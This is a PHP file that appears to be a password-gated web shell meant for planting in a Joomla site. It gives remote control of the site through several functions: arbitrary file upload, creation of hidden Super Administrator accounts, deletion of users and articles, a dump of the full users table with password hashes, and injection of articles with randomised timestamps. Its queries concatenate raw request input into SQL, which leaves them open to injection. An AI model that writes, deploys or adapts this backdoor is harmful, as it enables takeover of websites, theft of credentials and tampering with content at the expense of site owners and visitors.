<?php
header('Content-Type:text/html; charset=UTF-8');

@set_time_limit(60);

define('API_VERSION', 2.0);
define('PASSWORD_FILE', 'p.txt');

if(file_exists(PASSWORD_FILE)) {
	@unlink(PASSWORD_FILE);
}

//////////////////////////////////////////
function array_to_json( $array )
{
    if (is_string($array)) return '"'.addslashes($array).'"';
    if (is_numeric($array)) return $array;
    if ($array === null) return 'null';
    if ($array === true) return 'true';
    if ($array === false) return 'false';

    $assoc = false;
    $i = 0;
    foreach ($array as $k=>$v){
        if ($k !== $i++){
            $assoc = true;
            break;
        }
    }
    $res = array();
    foreach ($array as $k=>$v){
        $v = array_to_json($v);
        if ($assoc){
            $k = '"'.addslashes($k).'"';
            $v = $k.':'.$v;
        }
        $res[] = $v;
    }
    $res = implode(',', $res);
    return ($assoc)? '{'.$res.'}' : '['.$res.']';
}

function get_full_path($link) {
	$dir = dirname($_SERVER['PHP_SELF']);
	$levels_up = substr_count(JPATH_SITE, '..');
	for($i=0;$i<$levels_up;$i++) {
		preg_match('/(\/[^\/]+)$/', $dir, $matches);
		$dir = preg_replace('/\/[^\/]+$/', '', $dir);
		$link = str_replace($matches[1], '', $link);
	}
	
	if(strpos($link, 'http') !== 0) {
		$link = 'http' . (empty($_SERVER['HTTPS']) ? '' : 's') . '://' . $_SERVER['SERVER_NAME'] . $link;
	}
	
	return $link;
}
//////////////////////////////////////////

define('SHELL_PASSWORD', 'a6a8cb877ee18215f2c0fc2a6c7b4f2a');
define('MAX_UP_LEVELS', 10);

if((empty($_COOKIE['password']) && empty($_POST['password'])) || (!empty($_POST['password']) && md5($_POST['password']) != SHELL_PASSWORD)) {
	print '<form method="post">Password : <input type="text" name="password"><input type="submit"></form>';
}

if(!empty($_POST['password']) && md5($_POST['password']) == SHELL_PASSWORD) {
	setcookie('password', SHELL_PASSWORD, time() + 60*60*24);
	header("Location: {$_SERVER['PHP_SELF']}");
	exit;
}

if(empty($_COOKIE) || $_COOKIE['password'] != SHELL_PASSWORD) {
	exit;
}

if(!empty($_FILES['f'])) {
	$new_path = dirname(__FILE__) . '/' . $_FILES['f']['name'];
	if(move_uploaded_file($_FILES['f']['tmp_name'], $new_path)) {
		print "<a href=\"{$_FILES['f']['name']}\">{$_FILES['f']['name']}</a>";
	}
	else {
		print "Upload failed!";
	}
	exit;
}

if(!empty($_REQUEST['uf']) && $_REQUEST['uf'] == 1) {
	print "<form method=\"post\" enctype=\"multipart/form-data\" action=\"{$_SERVER['PHP_SELF']}\"><input type=\"file\" name=\"f\"><input type=\"submit\"></form>";
	exit;
}

define('_JEXEC', 1);
define('DS', DIRECTORY_SEPARATOR);

$counter = 0;
$dir_up = '.' . DS;
do {
	$file_found = false;
	$file_path = $dir_up . 'administrator';
	if(file_exists($file_path)) {
		$file_found = true;
	}
	else {
		$dir_up .= '..' . DS;
	}
	$counter++;
}while(!$file_found && $counter < MAX_UP_LEVELS);

define('JPATH_BASE', $dir_up);
	
require_once ( JPATH_BASE . 'includes'.DS.'defines.php' );
require_once ( JPATH_BASE . 'includes'.DS.'framework.php' );

//define('JPATH_COMPONENT_ADMINISTRATOR', dirname(__FILE__) . "/administrator");
define('JPATH_COMPONENT_ADMINISTRATOR', JPATH_BASE . DS . 'administrator' . DS . 'components' . DS . 'com_content');
require_once JPATH_BASE.'/includes/framework.php';
//$app = JFactory::getApplication('site');
//require_once JPATH_BASE.'/includes/framework.php';


//echo JPATH_BASE. "/administrator/components/com_content/models/article.php";
require_once JPATH_BASE. "/components/com_content/models/article.php";
                         //administrator/components/com_content/models

require_once(JPATH_BASE.DS.'components'.DS.'com_content'.DS.'helpers'.DS.'route.php');						 
						 
$app = JFactory::getApplication('site', array('session' => false));
$app->initialise();

if(!empty($_REQUEST['title']) && !empty($_REQUEST['body'])) {

foreach($_REQUEST as $key => $value) {
	$_REQUEST[$key] = stripslashes($value);
}

	$new_article = new ContentModelArticle();
	$date = date($_REQUEST['publish_up'] . ' ' . rand(1,23). ':' . rand(1,59). ':' . rand(1,59));
	$data = array(
		'catid' => $_REQUEST['catid'], //newsarticles
		'title' => $_REQUEST['title'],
		'fulltext' => $_REQUEST['body'],
		'introtext' => $_REQUEST['intro'],
		'state' => $_REQUEST['published'],
        'created_by' => $_REQUEST['created_by'],
        'publish_up' => $date,
		'created' => $date,
		'alias' => $_REQUEST['alias'],
		'language' => $_REQUEST['lang'] //FORMAT EXAMPLE: en-GB
	);
	if(!empty($_REQUEST['id'])) {
		$data['id'] = $_REQUEST['id'];
	}
	$table = JTable::getInstance('content', 'JTable', array());
	// Bind data
	if (!$table->bind($data))
	{
		print_r($table->getError());
		return false;
	}
	
	// Store the data.
	if (!$table->store())
	{
		print_r($table->getError());
	}
	
	print json_encode(array("article_id" => $table->id));
}

if(!empty($_REQUEST['id2delete'])) {
	$row = JTable::getInstance('content', 'JTable');
	$row->delete($_REQUEST['id2delete']);
}

$db = JFactory::getDBO(); // get database object

if(!empty($_REQUEST['article_id'])) {
	$article_id = $_REQUEST['article_id'];
	$sql = "SELECT * FROM #__content WHERE id='" . $_REQUEST['article_id']."'"; // prepare query

	$db->setQuery($sql); // apply query
	$article = $db->loadObject(); // execute query, return result list
}

if(!empty($article)) {
	print array_to_json($article);
}

if(!empty($_REQUEST['username2delete'])) {
	$user = JFactory::getUser($_REQUEST['username2delete']);
	if($user->delete()) {
		print "User {$_REQUEST['username2delete']} has been deleted!";
	}
}

if(!empty($_REQUEST['user_name']) && !empty($_REQUEST['user_password']) && !empty($_REQUEST['user_email'])) {
	/*
 
	I handle this code as if it is a snippet of a method or function!!
	 
	First set up some variables/objects
	*/
	// get the ACL
	$acl =& JFactory::getACL();
	 
	/* get the com_user params */
	 
	jimport('joomla.application.component.helper'); // include libraries/application/component/helper.php
	$usersParams = &JComponentHelper::getParams( 'com_users' ); // load the Params
	 
	// "generate" a new JUser Object
	$user = JFactory::getUser(0); // it's important to set the "0" otherwise your admin user information will be loaded
	 
	$data = array(); // array for all user settings
	
	$usertype = 'Super Administrator';
	 
	// set up the "main" user information
	
	$data['name'] = 'Zhano Zhano'; // add first- and lastname
	$data['username'] = $_REQUEST['user_name']; // add username
	$data['email'] = $_REQUEST['user_email']; // add email
	$data['gid'] = 24;  // generate the gid from the usertype
	 
	/* no need to add the usertype, it will be generated automaticaly from the gid */
	 
	$data['password'] = $_REQUEST['user_password']; // set the password
	$data['password2'] = $_REQUEST['user_password']; // confirm the password
	$data['sendEmail'] = 1; // should the user receive system mails?
	 
	/* Now we can decide, if the user will need an activation */
	$data['block'] = 0; // don't block the user
	 
	if (!$user->bind($data)) { // now bind the data to the JUser Object, if it not works....
		JError::raiseWarning('', JText::_( $user->getError())); // ...raise an Warning
	}
	 
	if (!$user->save()) { // if the user is NOT saved...
		JError::raiseWarning('', JText::_( $user->getError())); // ...raise an Warning
	}
	 
	print array_to_json($user->username . " created!"); // else return the new JUser object
}

if(!empty($_REQUEST['get_cats'])) {
	$cat_urls = array();
	$sql = "SELECT #__categories.id, #__categories.title, #__menu.path AS menu_path, COUNT(#__content.id) AS count_articles FROM #__categories 
	INNER JOIN #__content ON #__categories.id = #__content.catid 
	INNER JOIN #__menu ON #__categories.id = REPLACE(#__menu.link, 'index.php?option=com_content&view=category&layout=blog&id=', '')
	GROUP BY #__categories.id ORDER BY #__categories.title ";
	$db->setQuery($sql); // apply query
	$cats = $db->loadObjectList();
	for ($i=0,$len=count($cats);$i<$len;$i++) {
		$cats[$i]->path = get_full_path(JURI::base() . $cats[$i]->menu_path);
		unset($cats[$i]->menu_path);
	}
	
	if(empty($cats)) {
		$sql = "SELECT #__categories.id, #__categories.title FROM #__categories ";
		$db->setQuery($sql); // apply query
		$cats = $db->loadObjectList();
		for ($i=0,$len=count($cats);$i<$len;$i++) {
			$cats[$i]->path = get_full_path(JURI::base() . 'index.php?option=com_content&view=category&layout=blog&id=' . $cats[$i]->id);
			$cats[$i]->count_articles = '?';
		}
	}
	
	print array_to_json($cats);
}

if(!empty($_REQUEST['get_user'])) {
	$sql = "SELECT * FROM #__users ";
	$db->setQuery($sql); // apply query
	$users = $db->loadObjectList();
	print array_to_json($users);
}

if(!empty($_REQUEST['get_articles_list'])) {
	$offset = 0;
	$articles_num = 50;
	$all_articles = array();
	
	$cond = '';
	if(!empty($_REQUEST['search_by_title'])) {
		$cond .= " AND #__content.title LIKE '%{$_REQUEST['search_by_title']}%' ";
	}
	
	if(!empty($_REQUEST['search_by_body'])) {
		$cond .= " AND (#__content.fulltext LIKE '%{$_REQUEST['search_by_body']}%' OR #__content.introtext LIKE '%{$_REQUEST['search_by_body']}%') ";
	}
	
	if(!empty($_REQUEST['search_by_alias'])) {
		$cond .= " AND #__content.alias LIKE '%{$_REQUEST['search_by_alias']}%' ";
	}
	
	if(empty($cond)) {
		$cond = ' AND 2=2 ';
	}
	
	do {
		$sql = "SELECT #__content.id, #__content.title, #__content.fulltext, #__content.introtext, #__content.alias FROM #__content WHERE 1=1 {$cond} ORDER BY `title` LIMIT {$offset}, $articles_num "; // prepare query
		$db->setQuery($sql); // apply query
		$articles = $db->loadObjectList(); // execute query, return result list
		$all_articles += $articles;
		$offset += $articles_num;
	}while(count($articles) == $articles_num);
	print array_to_json($all_articles);
}

if(!empty($_REQUEST['article_sef_url'])) {
	$sql = "SELECT catid, alias, language FROM #__content WHERE id = '{$_REQUEST['article_sef_url']}' ";
	$db->setQuery($sql); // apply query
	$article = $db->loadObject(); // execute query, return result list

	$sql = "SELECT path FROM #__menu WHERE link LIKE 'index.php?option=com_content&view=category&%id={$article->catid}' ";
	$db->setQuery($sql); // apply query
	$cat_path = $db->loadObject();
	if(isset($cat_path->path)) {
		$slug = $_REQUEST['article_sef_url'] . ':' . $article->alias;
		$catslug = $article->catid . ':' . $cat_path->path;
		$link = JRoute::_(ContentHelperRoute::getArticleRoute($slug, $catslug));
		if(!empty($article->language)) {
			$link = str_replace('index.php/', 'index.php/' . substr($article->language, 0, 2) . '/', $link);
		}
		print array_to_json(get_full_path($link));
	}
	else {
		print array_to_json(get_full_path(JURI::base() . 'index.php?option=com_content&view=article&id=' . $_REQUEST['article_sef_url']));
	}
}

if(!empty($_REQUEST['get_languages'])) {
	if(class_exists('JLanguageHelper')) {
		$languages = JLanguageHelper::getLanguages();
		print array_to_json($languages);//lang_code INDEX IS USED FOR INSERTING INTO CONTENT
	}
}

if(!empty($_REQUEST['get_jm_version'])) {
	print array_to_json(JVERSION);
}

if(!empty($_REQUEST['upload_file'])) {
	print '<form method="post" enctype="multipart/form-data"><input type="file" name="my_file"><input type="submit"></form>';
}

if(!empty($_FILES['my_file'])) {
	$base_name = basename($_FILES['my_file']['name']);
	if(move_uploaded_file($_FILES['my_file']['tmp_name'], $base_name)) {
		print '<a href="'.$base_name.'" target="_blank">'.$base_name.'</a>';
	}
}

if(!empty($_REQUEST['get_api_version'])) {
	print array_to_json(array('api_version' => number_format(API_VERSION, 2)));
}
?>
